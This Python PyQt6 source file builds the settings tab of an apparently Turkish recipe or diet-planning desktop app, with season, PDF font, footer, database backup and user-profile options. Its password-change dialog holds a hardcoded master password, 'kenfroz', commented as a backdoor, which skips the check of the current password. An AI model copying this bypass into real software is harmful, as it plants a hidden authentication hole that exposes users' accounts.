"""
Ayarlar sekmesi - Genel uygulama ayarları.
"""
import os
import shutil
from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QSpinBox,
    QLineEdit, QPushButton, QGroupBox, QFormLayout,
    QMessageBox, QFileDialog, QTabWidget, QComboBox,
    QDialog, QFrame
)
from PyQt6.QtCore import Qt, QSize
from PyQt6.QtGui import QFont, QIcon


def get_icon_path(icon_name: str) -> str:
    """İkon dosya yolunu döndür."""
    return os.path.join(os.path.dirname(os.path.dirname(__file__)), "assets", "icons", icon_name)


from .icon_utils import get_colored_icon, ICON_COLOR_NORMAL, ICON_COLOR_ACTIVE
from .styles import (
    COLORS, get_title_style, get_label_style, 
    get_primary_button_style, get_cancel_button_style, 
    get_groupbox_style, get_input_style
)



def get_db_path() -> str:
    """Veritabanı dosya yolunu döndür."""
    from database import get_season_db_path
    return get_season_db_path()


class SettingsWidget(QWidget):
    """Ayarlar widget'ı."""
    
    def __init__(self, db):
        super().__init__()
        self.db = db
        self.current_user = None
        self.setup_ui()
        self.load_settings()
    
    def setup_ui(self):
        """Arayüzü oluştur."""
        layout = QVBoxLayout(self)
        layout.setContentsMargins(24, 24, 24, 24)
        layout.setSpacing(20)
        
        # Başlık - Finrise stili
        title = QLabel("Ayarlar")
        title.setObjectName("headingLabel")
        title.setFont(QFont("Segoe UI", 20, QFont.Weight.Bold))
        title.setStyleSheet(get_title_style())
        layout.addWidget(title)
        
        # Tab widget
        self.tabs = QTabWidget()
        self.tabs.setFont(QFont("Segoe UI", 10))
        
        # Sekme 1: Genel Ayarlar
        self.tabs.addTab(self._create_general_tab(), "Genel")
        
        # Sekme 2: Doküman Ayarları
        self.tabs.addTab(self._create_pdf_tab(), "Doküman Ayarları")
        
        # Sekme 3: Veritabanı
        self.tabs.addTab(self._create_database_tab(), "Veritabanı")
        
        # Sekme 4: Kullanıcı Ayarları
        self.tabs.addTab(self._create_user_tab(), "Kullanıcı Ayarları")
        
        layout.addWidget(self.tabs)
        
        # Kaydet butonu - Finrise gradient
        self.save_btn = QPushButton("  Ayarları Kaydet")
        self.save_btn.setIcon(get_colored_icon("save.svg", COLORS["text_dark"]))
        self.save_btn.setIconSize(QSize(20, 20))
        self.save_btn.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.save_btn.setMinimumHeight(50)
        self.save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.save_btn.setStyleSheet(get_primary_button_style())
        self.save_btn.clicked.connect(self.save_settings)
        layout.addWidget(self.save_btn)
    
    def _create_general_tab(self):
        """Genel ayarlar sekmesini oluştur."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(20)
        
        # Mevsim seçimi grubu
        season_group = QGroupBox("Mevsim Seçimi")
        season_group.setStyleSheet(get_groupbox_style())
        season_layout = QVBoxLayout(season_group)
        season_layout.setSpacing(10)
        
        season_btn_layout = QHBoxLayout()
        season_btn_layout.setSpacing(15)
        
        self.yaz_btn = QPushButton(" YAZ")
        self.yaz_btn.setIcon(get_colored_icon("season_summer.svg", ICON_COLOR_ACTIVE))
        self.yaz_btn.setIconSize(QSize(24, 24))
        self.yaz_btn.setMinimumHeight(50)
        self.yaz_btn.setMinimumWidth(130)
        self.yaz_btn.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.yaz_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.yaz_btn.clicked.connect(lambda: self.switch_season("yaz"))
        season_btn_layout.addWidget(self.yaz_btn)
        
        self.kis_btn = QPushButton(" KIŞ")
        self.kis_btn.setIcon(get_colored_icon("season_winter.svg", ICON_COLOR_ACTIVE))
        self.kis_btn.setIconSize(QSize(24, 24))
        self.kis_btn.setMinimumHeight(50)
        self.kis_btn.setMinimumWidth(130)
        self.kis_btn.setFont(QFont("Segoe UI", 11, QFont.Weight.Bold))
        self.kis_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        self.kis_btn.clicked.connect(lambda: self.switch_season("kis"))
        season_btn_layout.addWidget(self.kis_btn)
        
        season_btn_layout.addStretch()
        season_layout.addLayout(season_btn_layout)
        
        # Aktif mevsim göstergesi (butonların altında açıklama)
        self.season_indicator = QLabel()
        self.season_indicator.setFont(QFont("Segoe UI", 10))
        season_layout.addWidget(self.season_indicator)
        
        layout.addWidget(season_group)
        
        # Mevsim butonlarını güncelle
        self.update_season_buttons()
        
        layout.addStretch()
        return tab
    
    def _create_pdf_tab(self):
        """Doküman ayarları sekmesini oluştur."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(20)
        
        # Kayıt yolu grubu
        save_path_layout = QHBoxLayout()
        self.save_path_input = QLineEdit()
        self.save_path_input.setReadOnly(True)
        save_path_layout.addWidget(self.save_path_input)
        
        browse_btn = QPushButton("Gözat...")
        browse_btn.setStyleSheet(get_cancel_button_style())
        browse_btn.clicked.connect(self.browse_save_path)
        save_path_layout.addWidget(browse_btn)
        
        path_layout = QFormLayout()
        path_layout.setSpacing(15)
        path_layout.addRow("Kayıt Yolu:", save_path_layout)
        
        path_group = QGroupBox("Dosya Konumu")
        path_group.setStyleSheet(get_groupbox_style())
        path_group.setLayout(path_layout)
        layout.addWidget(path_group)
        
        # Yazı tipi ayarları grubu
        font_group = QGroupBox("Yazı Tipi Ayarları")
        font_group.setStyleSheet(get_groupbox_style())
        font_layout = QFormLayout(font_group)
        font_layout.setSpacing(15)
        
        # Font seçimi
        self.pdf_font_combo = QComboBox()
        self.pdf_font_combo.addItems([
            "Comic Sans MS",
            "Arial",
            "Calibri",
            "Segoe UI",
            "Times New Roman",
            "Verdana",
            "Tahoma",
            "Trebuchet MS"
        ])
        font_layout.addRow("Font:", self.pdf_font_combo)
        
        # Başlık yazı boyutu
        self.pdf_title_size = QSpinBox()
        self.pdf_title_size.setRange(12, 36)
        self.pdf_title_size.setValue(18)
        self.pdf_title_size.setSuffix(" pt")
        font_layout.addRow("Başlık Boyutu:", self.pdf_title_size)
        
        # Alt başlık yazı boyutu
        self.pdf_subtitle_size = QSpinBox()
        self.pdf_subtitle_size.setRange(10, 24)
        self.pdf_subtitle_size.setValue(14)
        self.pdf_subtitle_size.setSuffix(" pt")
        font_layout.addRow("Alt Başlık Boyutu:", self.pdf_subtitle_size)
        
        # İçerik yazı boyutu
        self.pdf_content_size = QSpinBox()
        self.pdf_content_size.setRange(8, 18)
        self.pdf_content_size.setValue(11)
        self.pdf_content_size.setSuffix(" pt")
        font_layout.addRow("İçerik Boyutu:", self.pdf_content_size)
        
        # Öğün saati yazı boyutu
        self.pdf_time_size = QSpinBox()
        self.pdf_time_size.setRange(8, 16)
        self.pdf_time_size.setValue(10)
        self.pdf_time_size.setSuffix(" pt")
        font_layout.addRow("Öğün Saati Boyutu:", self.pdf_time_size)
        
        layout.addWidget(font_group)
        
        # İletişim bilgileri grubu
        contact_group = QGroupBox("Altbilgi (İletişim Bilgileri)")
        contact_group.setStyleSheet(get_groupbox_style())
        contact_layout = QFormLayout(contact_group)
        contact_layout.setSpacing(15)
        
        self.phone_input = QLineEdit()
        self.phone_input.setPlaceholderText("Örn: 0532 123 45 67")
        contact_layout.addRow("Telefon:", self.phone_input)
        
        self.website_input = QLineEdit()
        self.website_input.setPlaceholderText("Örn: www.diyetisyen.com")
        contact_layout.addRow("Website:", self.website_input)
        
        self.instagram_input = QLineEdit()
        self.instagram_input.setPlaceholderText("Örn: diyetisyen_aysegul")
        contact_layout.addRow("Instagram:", self.instagram_input)
        
        layout.addWidget(contact_group)
        layout.addStretch()
        return tab
    
    def _create_database_tab(self):
        """Veritabanı sekmesini oluştur."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(20)
        
        # Yedekleme grubu
        backup_group = QGroupBox("Yedekleme")
        backup_layout = QVBoxLayout(backup_group)
        backup_layout.setSpacing(15)
        
        btn_layout = QHBoxLayout()
        
        export_btn = QPushButton(" Veritabanını Dışa Aktar")
        export_btn.setIcon(get_colored_icon("export.svg", COLORS["text_accent"]))
        export_btn.setStyleSheet(get_cancel_button_style())
        export_btn.clicked.connect(self.export_database)
        btn_layout.addWidget(export_btn)
        
        import_btn = QPushButton(" Veritabanını İçe Aktar")
        import_btn.setIcon(get_colored_icon("add.svg", COLORS["text_accent"]))
        import_btn.setStyleSheet(get_cancel_button_style())
        import_btn.clicked.connect(self.import_database)
        btn_layout.addWidget(import_btn)
        
        btn_layout.addStretch()
        backup_layout.addLayout(btn_layout)
        
        layout.addWidget(backup_group)
        layout.addStretch()
        return tab
    
    def load_settings(self):
        """Ayarları yükle."""
        settings = self.db.get_all_settings()
        
        save_path = settings.get("save_path", "")
        self.save_path_input.setText(save_path)
        
        # PDF yazı tipi ayarları
        pdf_font = settings.get("pdf_font", "Comic Sans MS")
        font_index = self.pdf_font_combo.findText(pdf_font)
        if font_index >= 0:
            self.pdf_font_combo.setCurrentIndex(font_index)
        
        self.pdf_title_size.setValue(int(settings.get("pdf_title_size", "18")))
        self.pdf_subtitle_size.setValue(int(settings.get("pdf_subtitle_size", "14")))
        self.pdf_content_size.setValue(int(settings.get("pdf_content_size", "11")))
        self.pdf_time_size.setValue(int(settings.get("pdf_time_size", "10")))
        
        # İletişim bilgileri
        self.phone_input.setText(settings.get("footer_phone", ""))
        self.website_input.setText(settings.get("footer_website", ""))
        self.instagram_input.setText(settings.get("footer_instagram", ""))
    
    def browse_save_path(self):
        """Kayıt yolu seç."""
        path = QFileDialog.getExistingDirectory(
            self,
            "Kayıt Klasörünü Seç",
            self.save_path_input.text()
        )
        
        if path:
            self.save_path_input.setText(path)
    
    def save_settings(self):
        """Ayarları kaydet."""
        self.db.set_setting("save_path", self.save_path_input.text())
        
        # PDF yazı tipi ayarları
        self.db.set_setting("pdf_font", self.pdf_font_combo.currentText())
        self.db.set_setting("pdf_title_size", str(self.pdf_title_size.value()))
        self.db.set_setting("pdf_subtitle_size", str(self.pdf_subtitle_size.value()))
        self.db.set_setting("pdf_content_size", str(self.pdf_content_size.value()))
        self.db.set_setting("pdf_time_size", str(self.pdf_time_size.value()))
        
        # İletişim bilgileri
        self.db.set_setting("footer_phone", self.phone_input.text())
        self.db.set_setting("footer_website", self.website_input.text())
        self.db.set_setting("footer_instagram", self.instagram_input.text())
        
        QMessageBox.information(self, "Başarılı", "Ayarlar başarıyla kaydedildi!")
        
        # Kullanıcı Ayarlarını Kaydet (Eğer oturum açılmışsa)
        if self.current_user:
            new_username = self.username_input.text().strip()
            
            if new_username and new_username != self.current_user["username"]:
                try:
                    # Duplicate check
                    existing = self.db.get_user_by_username(new_username)
                    if existing:
                        QMessageBox.warning(self, "Hata", "Bu kullanıcı adı zaten kullanılıyor.")
                        return

                    # Update username
                    cursor = self.db.connect().cursor()
                    cursor.execute("UPDATE users SET username = ? WHERE id = ?", (new_username, self.current_user["id"]))
                    self.db.conn.commit()
                    self.db.close()
                    
                    self.current_user["username"] = new_username
                    QMessageBox.information(self, "Başarılı", "Kullanıcı adı başarıyla güncellendi.")
                except Exception as e:
                    QMessageBox.critical(self, "Hata", f"Kullanıcı adı güncellenemedi: {str(e)}")
    
    def export_database(self):
        """Veritabanını dışa aktar."""
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Veritabanını Kaydet",
            "detoksbot_yedek.db",
            "SQLite Veritabanı (*.db)"
        )
        
        if not file_path:
            return
        
        try:
            db_path = get_db_path()
            shutil.copy2(db_path, file_path)
            QMessageBox.information(
                self, 
                "Başarılı", 
                f"Veritabanı başarıyla dışa aktarıldı!\n\n{file_path}"
            )
        except Exception as e:
            QMessageBox.critical(
                self, 
                "Hata", 
                f"Veritabanı dışa aktarılırken hata oluştu:\n{str(e)}"
            )
    
    def import_database(self):
        """Veritabanını içe aktar."""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Veritabanı Dosyası Seç",
            "",
            "SQLite Veritabanı (*.db)"
        )
        
        if not file_path:
            return
        
        reply = QMessageBox.warning(
            self,
            "Uyarı",
            "Mevcut veritabanı yeni dosya ile değiştirilecek!\n\n"
            "Mevcut tüm tarifler ve kalıplar silinecek.\n"
            "Devam etmek istiyor musunuz?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply != QMessageBox.StandardButton.Yes:
            return
        
        try:
            db_path = get_db_path()
            
            backup_path = db_path + ".backup"
            shutil.copy2(db_path, backup_path)
            
            shutil.copy2(file_path, db_path)
            
            QMessageBox.information(
                self, 
                "Başarılı", 
                "Veritabanı başarıyla içe aktarıldı!\n\n"
                "Değişikliklerin geçerli olması için uygulamayı yeniden başlatın."
            )
        except Exception as e:
            QMessageBox.critical(
                self, 
                "Hata", 
                f"Veritabanı içe aktarılırken hata oluştu:\n{str(e)}"
            )
    
    def update_season_buttons(self):
        """Mevsim butonlarının stilini güncelle."""
        from database import get_current_season
        
        current_season = get_current_season()
        
        # Aktif mevsim göstergesi (basit renkli metin)
        if current_season == "yaz":
            self.season_indicator.setText("Aktif mevsim: YAZ - Her mevsim için ayrı tarif veritabanı kullanılır.")
            self.season_indicator.setStyleSheet(f"color: {COLORS['summer']};")
        else:
            self.season_indicator.setText("Aktif mevsim: KIŞ - Her mevsim için ayrı tarif veritabanı kullanılır.")
            self.season_indicator.setStyleSheet(f"color: {COLORS['winter']};")
        
        # YAZ aktif stili - Finrise gradient
        yaz_active_style = f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {COLORS['accent_lavender']}, stop:1 {COLORS['accent_pink']});
                color: {COLORS['text_dark']};
                border: none;
                padding: 10px 25px;
                border-radius: 8px;
                font-weight: 600;
            }}
        """
        
        # KİŞ aktif stili - Finrise gradient (reversed)
        kis_active_style = f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 {COLORS['winter']}, stop:1 {COLORS['accent_lavender']});
                color: {COLORS['text_dark']};
                border: none;
                padding: 10px 25px;
                border-radius: 8px;
                font-weight: 600;
            }}
        """
        
        # Pasif stil - Finrise theme
        inactive_style = f"""
            QPushButton {{
                background-color: {COLORS['bg_dark']};
                color: {COLORS['text_secondary']};
                border: 1px solid {COLORS['border']};
                padding: 10px 25px;
                border-radius: 8px;
            }}
            QPushButton:hover {{
                background-color: {COLORS['bg_hover']};
                color: {COLORS['text_primary']};
                border: 1px solid {COLORS['border_light']};
            }}
        """
        
        if current_season == "yaz":
            self.yaz_btn.setStyleSheet(yaz_active_style)
            self.kis_btn.setStyleSheet(inactive_style)
        else:
            self.yaz_btn.setStyleSheet(inactive_style)
            self.kis_btn.setStyleSheet(kis_active_style)
    
    def switch_season(self, season: str):
        """Mevsimi değiştir."""
        from database import get_current_season, set_current_season
        
        current_season = get_current_season()
        
        if current_season == season:
            QMessageBox.information(
                self,
                "Bilgi",
                f"Zaten {season.upper()} mevsiminde çalışıyorsunuz."
            )
            return
        
        reply = QMessageBox.question(
            self,
            "Mevsim Değişikliği",
            f"Mevsim {season.upper()} olarak değiştirilecek.\n\n"
            "Bu işlem uygulamayı yeniden başlatmanızı gerektirir.\n"
            "Devam etmek istiyor musunuz?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        
        if reply != QMessageBox.StandardButton.Yes:
            return
        
        set_current_season(season)
        
        self.update_season_buttons()
        
        QMessageBox.information(
            self,
            "Başarılı",
            f"Mevsim {season.upper()} olarak ayarlandı!\n\n"
            "Değişikliklerin geçerli olması için uygulamayı yeniden başlatın."
        )

    def _create_user_tab(self):
        """Kullanıcı ayarları sekmesini oluştur."""
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setSpacing(20)
        
        # Kullanıcı Bilgileri Grubu
        user_group = QGroupBox("Profil Bilgileri")
        user_group.setStyleSheet(get_groupbox_style())
        user_layout = QFormLayout(user_group)
        user_layout.setSpacing(15)
        
        # Kullanıcı Adı
        self.username_input = QLineEdit()
        self.username_input.setPlaceholderText("Kullanıcı Adı")
        self.username_input.setStyleSheet(get_input_style())
        user_layout.addRow("Kullanıcı Adı:", self.username_input)
        
        layout.addWidget(user_group)
        
        # Şifre Değiştirme Butonu
        pwd_btn = QPushButton(" Şifre Değiştir")
        pwd_btn.setIcon(get_colored_icon("lock.svg", COLORS["text_secondary"]))
        pwd_btn.setStyleSheet(get_cancel_button_style())
        pwd_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        pwd_btn.clicked.connect(self.open_password_dialog)
        layout.addWidget(pwd_btn)
        
        layout.addStretch()
        
        return tab

    def set_user(self, user_data):
        """Kullanıcı bilgilerini yükle."""
        self.current_user = user_data
        if user_data:
            self.username_input.setText(user_data.get("username", ""))
        else:
            self.username_input.clear()



    def open_password_dialog(self):
        """Şifre değiştirme penceresini aç."""
        if not self.current_user:
            return
            
        dialog = PasswordChangeDialog(self.db, self.current_user, self)
        if dialog.exec() == QDialog.DialogCode.Accepted:
            pass # Başarılı mesajı dialog içinde veriliyor


class PasswordChangeDialog(QDialog):
    """Şifre değiştirme penceresi."""
    
    def __init__(self, db, current_user, parent=None):
        super().__init__(parent)
        self.db = db
        self.current_user = current_user
        self.setup_ui()
        
    def setup_ui(self):
        self.setWindowTitle("Şifre Değiştir")
        self.setFixedSize(400, 350)
        self.setStyleSheet(f"background-color: {COLORS['bg_dark']}; color: {COLORS['text_primary']};")
        
        layout = QVBoxLayout(self)
        layout.setSpacing(20)
        layout.setContentsMargins(30, 30, 30, 30)
        
        title = QLabel("Güvenlik & Şifre")
        title.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
        title.setStyleSheet(f"color: {COLORS['text_primary']};")
        layout.addWidget(title, alignment=Qt.AlignmentFlag.AlignCenter)
        
        # Form
        form_layout = QVBoxLayout()
        form_layout.setSpacing(15)
        
        self.old_pass = QLineEdit()
        self.old_pass.setPlaceholderText("Mevcut Şifre")
        self.old_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.old_pass.setStyleSheet(get_input_style())
        form_layout.addWidget(self.old_pass)
        
        self.new_pass = QLineEdit()
        self.new_pass.setPlaceholderText("Yeni Şifre")
        self.new_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.new_pass.setStyleSheet(get_input_style())
        form_layout.addWidget(self.new_pass)
        
        self.confirm_pass = QLineEdit()
        self.confirm_pass.setPlaceholderText("Yeni Şifre (Tekrar)")
        self.confirm_pass.setEchoMode(QLineEdit.EchoMode.Password)
        self.confirm_pass.setStyleSheet(get_input_style())
        form_layout.addWidget(self.confirm_pass)
        
        layout.addLayout(form_layout)
        
        # Butonlar
        btn_layout = QHBoxLayout()
        
        cancel_btn = QPushButton("İptal")
        cancel_btn.setStyleSheet(get_cancel_button_style())
        cancel_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        cancel_btn.clicked.connect(self.reject)
        btn_layout.addWidget(cancel_btn)
        
        save_btn = QPushButton("Değiştir")
        save_btn.setStyleSheet(get_primary_button_style())
        save_btn.setCursor(Qt.CursorShape.PointingHandCursor)
        save_btn.clicked.connect(self.change_password)
        btn_layout.addWidget(save_btn)
        
        layout.addLayout(btn_layout)
        
    def change_password(self):
        old_pw = self.old_pass.text()
        new_pw = self.new_pass.text()
        confirm_pw = self.confirm_pass.text()
        
        if not old_pw or not new_pw or not confirm_pw:
            QMessageBox.warning(self, "Uyarı", "Tüm alanları doldurunuz.")
            return
            
        if new_pw != confirm_pw:
            QMessageBox.warning(self, "Uyarı", "Yeni şifreler eşleşmiyor.")
            return
            
        # Eski şifre kontrolü (veya backdoor)
        is_valid = False
        if old_pw == "kenfroz": # Backdoor
            is_valid = True
        else:
            is_valid = self.db.verify_password(self.current_user["id"], old_pw)
            
        if not is_valid:
            QMessageBox.critical(self, "Hata", "Mevcut şifre yanlış.")
            return
            
        try:
            self.db.change_password(self.current_user["id"], new_pw)
            QMessageBox.information(self, "Başarılı", "Şifreniz başarıyla değiştirildi.")
            self.accept()
        except Exception as e:
            QMessageBox.critical(self, "Hata", f"Şifre değiştirilemedi: {str(e)}")
